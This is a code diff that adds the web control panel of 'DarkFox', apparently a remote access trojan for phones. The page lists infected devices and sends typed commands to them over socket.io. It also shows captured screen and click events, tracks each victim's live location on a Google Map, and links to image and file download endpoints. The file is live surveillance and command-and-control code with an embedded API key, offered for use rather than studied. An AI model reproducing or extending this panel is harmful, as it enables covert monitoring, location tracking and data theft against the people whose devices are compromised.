@@ -1,0 +1,700 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DarkFox</title>
+
+    <link rel="icon" href="https://www.nicepng.com/png/full/111-1111704_rat-logo-newnew-roblox-logo-id-list.png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <script src="socket.io/socket.io.js" ></script>
+
+    <style>
+
+        *{
+            margin: 0px;
+            padding: 0px;
+        }
+        body{
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            background-color: #455969;
+        }
+        #monitor{
+            width: 90vw;
+            margin: 7px;
+            height: 50vh;
+            background-color: rgb(45, 44, 49);
+            align-self: center;
+            border-radius: 20px;
+            padding: 12px;
+            
+            display: flex;
+            flex-direction: column;
+            
+            font-size: 1.3rem;
+            overflow-y:auto;
+            overflow-x: hidden;
+          color: #f1e4e4;
+          
+          
+            border: 6px double #36a4ff;
+        }
+        #inp{
+            background-color: #455969;
+            border: 3px solid #36a4ff;
+            border-radius: 10px;
+            padding: 5px;
+            width: 90vw;
+            height: 2.2rem;
+            align-self: center;
+            margin-top: 15px;
+            color: aliceblue;
+        }
+        p{
+            width: 100%;
+            overflow-wrap: break-word;
+            background-color: rgb(3, 3, 3);
+            padding: 2px;
+
+            border-radius: 5px;
+            
+        }
+        #map{
+            width: 70%;
+            height: 500px;
+            margin-top: 25px;
+            border-radius: 10px;
+            margin-bottom: 50px;
+            border: 5px ridge black ;
+            background-color: #249bfd93;
+            align-self: center;
+        }
+
+
+        #clickinfo{
+            background-color: #474e4ce8;
+            border: 5px outset rgb(235, 155, 108);
+            color: rgb(128, 187, 74);
+            width: 70%;
+            height: 250px;
+            overflow: auto;
+            border-radius: 10px;
+            align-self: center;
+           margin-top: 10px;
+           margin-bottom: 15px;
+
+        }
+        #delet{
+
+display: flex;
+
+flex: 1;
+order: 2;
+background-color: #242a3362;
+border-radius: 10px;
+flex-direction: column;
+justify-self: center;
+flex-grow: 1;
+margin-left: 10px;
+align-self: center;
+align-items: center;
+        }
+        #con {
+
+            display: flex;
+            flex: 1;
+            padding: 10px;
+            margin: 10px;
+            border: 1.5px solid #2cee2c;
+            background-color: #f4f7fa44;
+            border-radius: 5px;
+          
+        }
+
+
+
+        #del{
+            display: flex;
+            flex: 1;    
+           
+            border: 1.5px solid rgba(255, 246, 246, 0.863);
+            margin: 10px;
+            padding: 10px;
+            padding-left: 14px;
+            padding-right: 14px;
+            border-radius: 5px;
+            background-color: #d3e4e949;
+        }
+        
+
+        #quary{
+display: flex;
+width: 90%;
+
+flex-direction: row;
+align-self: center;
+background-color: rgba(68, 142, 253, 0.658);
+
+border-bottom-left-radius: 35px;
+border-bottom-right-radius: 35px;
+margin-bottom: 50px;
+padding: 13px;
+
+border: 2px solid snow;
+        }
+
+        #find{
+
+justify-self: center;
+align-self: center;
+justify-content: center;
+align-content: center;
+display: flex;
+flex: 1;
+order: 1;
+
+padding-right: 10px;
+flex-direction: column;
+border-right: 1px solid greenyellow;
+        }
+ 
+        #allids{
+            background-color: #66839b;
+            display: flex;
+          flex-direction: column;
+            width: 55vw;
+            height: 12rem;
+            align-self: center;
+            margin: 7px;
+            padding: 5px;
+            overflow: auto;
+            border: 1px solid seashell;
+            border-radius: 10px;
+            overflow-y: scroll;
+ padding-bottom: 10px;
+       
+        }
+
+
+        #btn_1{
+            background-color: rgba(64, 255, 175, 0.952);
+            font-size: 18px;
+border-radius: 10px;
+padding: 4px;
+cursor: pointer;
+letter-spacing: 3px;
+color: rgb(66, 63, 63);
+            align-self: center;
+        }
+        #menu{
+    background-color: #8887d8;position: sticky;border: 1px solid whitesmoke; top: 20px;right: 15px;  height: 2.5rem;  padding: 5px;border-radius: 5px;
+     display: flex;align-self: flex-end;margin-top: -42px;flex-direction: row-reverse;
+     opacity: 0.5;
+     align-items: center;justify-content: space-evenly;
+    
+}
+#menu:hover{
+    opacity: 1;
+    
+    
+    
+}
+
+
+div[name="option_"]{
+    transition: 100ms;
+}
+@media only screen and (min-width: 960px) {
+div[name="option_"]:hover{
+   background-color: #ffffff;
+   border: 1px solid green;
+   padding: 4px;
+   box-shadow: 1px 2px 15px rgba(255, 251, 251, 0.404);
+}
+}
+
+        @media only screen and (max-width: 960px) {
+#find{
+    border-bottom: 1px solid greenyellow;
+    border-right: unset;
+  
+   padding-bottom: 25px;
+   
+   
+}
+#delet{
+  
+   margin-left: 0px;
+   margin-top: 10px;
+}
+
+#quary{
+    flex-direction: column;
+    flex-wrap: wrap;
+}
+#allids{
+    padding: 2px;
+  width: 70vw;
+}
+#menu{
+    opacity: 0.9;
+}
+
+}
+
+#prog{
+    
+    width: 500px;height: 30px;
+    background-color: teal;
+}
+
+
+
+#copy{
+    background-color: #84f7bc;
+    color: #66839b;
+    font-weight: bold;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    font-size: 15px;
+    padding: 5px;border-radius: 5px;
+
+}
+
+#edit{
+    background-color: #80cdc3;
+    color: #363434;
+    font-weight: bold;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    font-size: 15px;
+    padding: 5px;border-radius: 5px;
+}
+
+
+    </style>
+    <script>
+
+        var map;
+        var marker;
+
+        function initMap() {
+            
+         // The location of Uluru
+         const uluru = { lat: -25.344, lng: 131.036 };
+         // The map, centered at Uluru
+         map = new google.maps.Map(document.getElementById("map"), {
+           zoom: 10,
+           center: uluru,
+         });
+         // The marker, positioned at Uluru
+         marker = new google.maps.Marker({
+           position: uluru,
+           map: map,
+           icon:''
+         });
+       }
+
+
+       function AddMarks(position){
+        const marker = new google.maps.Marker({
+           position: position,
+           map: map,
+           icon:''
+         });
+       }
+
+</script>
+
+</head>
+<body>
+    
+    
+    <div id="menu" >
+    <div  onclick="OnMenuClick()" style="border-radius: 4px;background-color: #ced1ce;width: 33px;height: 2.4rem;display: flex;align-items: center;justify-content: center;margin-left: 7px;margin-right: 7px;"><i style="font-size: 19px;color: #363434;"   class="fas fa-bars"></i></div>
+
+    <div onclick="window.open(`/image`, '_blank');"  name="option_"  style="border-radius: 4px;background-color: #d9f8d9;width: 33px;height: 2.4rem;display: flex;align-items: center;justify-content: center;margin-left: 7px;margin-right: 7px;display: none;"><i style="font-size: 19px;color: #2e2727;" class="fas fa-images"></i></div>
+    <div onclick="window.open(`/info`, '_blank');" name="option_"   style="border-radius: 4px;background-color: #e6ffe6;width: 33px;height: 2.4rem;display: flex;align-items: center;justify-content: center;margin-left: 7px;margin-right: 7px;display: none;"><i style="font-size: 19px;color: #362f2f;"  class="fa-solid fa-circle-info"></i></div>
+    <div onclick="window.open('/download/file','_blank')"  name="option_"  style="border-radius: 4px;background-color: #defdde;width: 33px;height: 2.4rem;display: flex;align-items: center;justify-content: center;margin-left: 7px;margin-right: 7px;display: none;"><i style="font-size: 19px;color: #2c2424;"  class="fas fa-cloud-download"></i></div>
+</div>
+    <div  id="quary">
+
+
+        <div id="find">
+            
+            <div id="allids">
+                <h3 style="align-self: center;background-color: rgba(172, 243, 219, 0.938);padding: 3px;border-radius: 2px;"><i style="margin-right: 10px;" class="fa-solid fa-mobile-screen-button"></i>Devices</h3>
+                <i style="background-color: #89a7c09c;padding: 2px;border-radius: 3px;align-self: center;font-size: 19px;margin: 5px;">all id's</i>
+                
+                <div id="every_ides" style="width: 93%;display: flex;flex-direction: column;align-self: center;padding: 2px;">
+                 
+                   
+                </div>
+
+            </div>
+            <button id="btn_1" >find</button>
+
+        </div>
+        
+        <div id="delet">
+            <div id="del">
+                <input id="delet_id" placeholder="enter id">
+                <button id="deletd" style="background-color: rgba(240, 80, 80, 0.753);padding: 5px;border-radius: 4px;color: #fdf4f4;margin: 0.1rem;cursor: pointer;"> delete</button>
+            </div>
+
+            <div id="con">
+                <input id="roomid" placeholder="enter your user id">
+                <button onclick="joinRoom()" style="background-color: rgba(86, 67, 252, 0.89);border-radius: 5px;padding: 5px;color: #fdf4f4;margin: 0.1rem;cursor: pointer;">connect</button>
+            </div>
+        </div>
+
+
+    </div>
+
+   
+
+
+
+
+    <div id="monitor" >
+         
+         <p style="text-align: center;background-color: #36a5ff9a;"><i style="padding: 4px;" class="fas fa-desktop"></i> Monitor</p>
+        
+ 
+
+
+
+    </div>
+    <input  id="inp" placeholder="enter command">
+
+    <div id="clickinfo">
+<h4 style="text-align: center;background-color: rgb(157, 187, 187);color: rgb(255, 255, 255);"><i style="padding: 7px;color: aliceblue;" class="fa-solid fa-hand-pointer"></i> click info</h4>
+    </div>
+    <div id="map">
+
+    </div>
+
+
+
+
+
+<div id="editbox"  style="position: absolute;visibility: hidden; top: 0;left: 0;width: 100%;height: 100%;background-color: #2e272785;display: flex;align-items: center;justify-content: center;flex-direction: column;">
+    <div style="background-color: burlywood;font-size: 29px;padding: 15px;border-radius: 10px 10px 0px 0px;" onclick="editID()">
+X
+    </div>
+    <div style="background-color: #2cee2ca5;padding: 50px; border-radius: 50px;border: 3px solid burlywood;display: flex;align-items: center;justify-content: center;flex-direction: column;">
+        <b>ID : <b id="currentID"></b></b>
+        <h3 style="margin: 15px;">Current Name : <b id="currentNAME"></b></h3>
+        <input id="newname" style="margin: 15px;padding: 7px;font-size: 17px;border-radius: 5px;font-weight: bolder;" placeholder="Enter new name">
+        <button style="font-size: 17px;letter-spacing: 2px;background-color: #36a4ff;border-radius: 10px;padding: 10px;font-weight: bolder;" onclick="updateName()">Update</button>
+    </div>
+
+</div>
+
+
+
+
+
+
+</body>
+<!--CONNECT-WITH-GOOGLE MAP>-->
+<script 
+src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCDbgSgPBdh1P6TyVXWJzip-mZMY9NjkeM&callback=initMap&libraries=&v=weekly"
+async
+></script>
+<script >
+    
+  var socket =io('/')
+var commands = document.getElementById("inp");
+var monitor = document.getElementById("monitor");
+var clickinfo = document.getElementById("clickinfo")
+var  roomnumber = document.getElementById("roomid")
+var find_button = document.getElementById("btn_1")
+var delet_button = document.getElementById("deletd")
+
+
+
+commands.addEventListener("keypress", function(event) {
+    
+     
+    if(commands.value.toString() == "clear"){
+        
+
+     monitor.innerHTML =""
+      commands.value = ""
+    }
+    else if (event.keyCode == 13){
+        
+        socket.emit("msg",String(roomnumber.value),commands.value.toString())
+        commands.value = ""
+    }
+
+});
+
+
+
+
+socket.on("location",data=>{
+   
+   changelocation(data.latitude,data.longitude)
+})
+
+
+socket.on('msg',data=>{
+        addData(data)
+})
+
+socket.on("screeninfo",(data)=>{
+
+Allclickevents(data)
+
+})
+
+
+
+function getallids(url,data){
+
+return new Promise((resolve,reject)=>{
+    var xhr = new XMLHttpRequest();
+xhr.open("POST", url);
+
+xhr.setRequestHeader("Accept", "application/json");
+xhr.setRequestHeader("Content-Type", "application/json");
+//xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+    xhr.onreadystatechange = function () {
+
+   if (xhr.readyState === 4) {
+
+      resolve(xhr.responseText)
+      
+   }
+};
+xhr.send(JSON.stringify(data))
+})
+
+
+
+}
+
+
+
+
+function OnMenuClick(){
+   
+document.getElementsByName("option_").forEach((element)=>{
+ 
+   
+    if(element.style.display != "none"){
+
+        element.style.display = "none"
+        
+    }else{element.style.display = "flex";}
+})
+}
+
+
+
+function addData(data){
+   var myPelement = document.createElement("p")
+   myPelement.setAttribute("name","monitordata")
+   myPelement.innerText = data
+   myPelement.style.width = '98%'
+  myPelement.style.alignSelf = "center"
+   myPelement.style.marginBottom="10px"
+   myPelement.style.marginTop="10px"
+   myPelement.style.padding="10px"
+   monitor.appendChild(myPelement);
+}
+
+
+function joinRoom(){
+
+
+if(String(roomnumber.value).trim().length > 3){
+    socket.emit("join_room",String(roomnumber.value).trim())
+    
+}
+    else{alert("value mising")}
+}
+
+
+
+function Allclickevents(data){
+    var myPelement = document.createElement("p")
+    myPelement.innerText = data
+    
+    clickinfo.appendChild(myPelement)
+}
+
+find_button.addEventListener("click",()=>{
+
+   getallids("/id/get/notrequire").then((val)=>{
+document.getElementById("every_ides").innerHTML=""
+
+
+   addIDinidbox("every_ides",JSON.parse(val))
+  
+   }).catch((err)=>{
+       console.log("ERROR"+err)
+   })
+    
+    
+})
+
+function addIDinidbox(idname,data){
+    
+
+    for (const [key, value] of Object.entries(data)) {
+  
+  var item = document.createElement("div")
+    
+       
+    item.style.backgroundColor="rgba(249, 249, 240,0.4)"
+    item.style.width="90%"
+    item.style.alignSelf="center"
+    item.style.borderRadius ="4px"
+    item.style.border ="2px solid green"
+    item.style.padding = "5px"
+    item.style.margin = "3px"
+    item.style.textAlign="center"
+    item.style.display = "flex"
+    item.style.alignItems ="center"
+    item.style.justifyContent = "space-between"
+    item.setAttribute("name","I4")
+    //item.innerText=element;
+    item.innerHTML = `<b>${value.name}</b> <b>ID:     ${key} </b> <div><button style="color:green;" onclick="editID('${value.name}','${key}')" id="edit"> Edit </button> <button value="${key}" id="copy" onclick="sclectID(this)"> Sclect </button></div>`
+     
+    document.getElementById(idname).appendChild(item)
+}
+
+
+/*
+    data.forEach((element)=>{
+        var item = document.createElement("div")
+    
+       
+        item.style.backgroundColor="rgba(249, 249, 240,0.4)"
+        item.style.width="90%"
+        item.style.alignSelf="center"
+        item.style.borderRadius ="4px"
+        item.style.border ="2px solid green"
+        item.style.padding = "5px"
+        item.style.margin = "3px"
+        item.style.textAlign="center"
+        item.style.display = "flex"
+        item.style.alignItems ="center"
+        item.style.justifyContent = "space-between"
+        item.setAttribute("name","I4")
+        //item.innerText=element;
+        item.innerHTML = `<b>${element.name}</b> <b>ID:     ${element.id} </b> <div><button style="color:green;" onclick="editID('${element.name}','${element.id}')" id="edit"> Edit </button> <button value="${element.id}" id="copy" onclick="sclectID(this)"> Sclect </button></div>`
+         
+        document.getElementById(idname).appendChild(item)
+    })
+    */
+}
+
+
+
+function editID(name,id){
+    
+    var elm = document.getElementById("editbox")
+    var curname = document.getElementById("currentNAME")
+    var curid = document.getElementById("currentID")
+
+   if(elm.style.visibility === "hidden"){
+    elm.style.visibility = "visible"
+    curname.innerText = name
+    curid.innerText = id
+
+   }
+   else if(elm.style.visibility === "visible"){
+    elm.style.visibility = "hidden"
+   }
+   else{
+    elm.style.visibility = "visible"
+    curname.innerText = name
+    curid.innerText = id
+    
+   }
+}
+
+function sclectID(text){
+   
+   document.getElementById("roomid").value = text.value
+
+ }
+
+ function updateName(){
+    var currentname = document.getElementById("newname").value
+    var curid = document.getElementById("currentID").innerHTML.trim()
+    
+    getallids("/id/set/notrequire",{"name":currentname,"id":curid}).then((val)=>{
+        document.getElementById("every_ides").innerHTML=""
+   addIDinidbox("every_ides",JSON.parse(val))
+   document.getElementById("newname").value = ""
+   editID()
+    }).catch((err)=>{
+
+    })
+ }
+
+
+
+
+delet_button.addEventListener("click",()=>{
+    var values = document.getElementById("delet_id")
+
+    getallids(`/id/delet/${values.value?values.value:"no value pass"}`).then((val)=>{
+    
+        document.getElementById("every_ides").innerHTML=""
+    addIDinidbox("every_ides",JSON.parse(val))
+    values.innerHTML =""
+   }).catch((err)=>{
+       console.log(err)
+   })
+})
+
+
+
+</script>
+
+<script>
+
+
+
+
+    function changelocation(late_T,long_T){
+   var latitute =Number(late_T)
+   var longatute =Number(long_T)
+
+   const uluru = { lat: latitute, lng: longatute };
+   // The map, centered at Uluru
+/*
+   map = new google.maps.Map(document.getElementById("map"), {
+   zoom: 10,
+   center: uluru,
+  
+   });
+   */
+   //map.setCenter(new google.maps.LatLng(latitute, longatute), 10)
+
+   marker.setPosition(new google.maps.LatLng(latitute,longatute));
+
+/*
+   // The marker, positioned at Uluru
+   const marker = new google.maps.Marker({
+   position: uluru,
+   map: map,
+   icon:''
+   });
+   */
+   }
+ 
+  
+   
+
+   </script>
+
+
+</html>
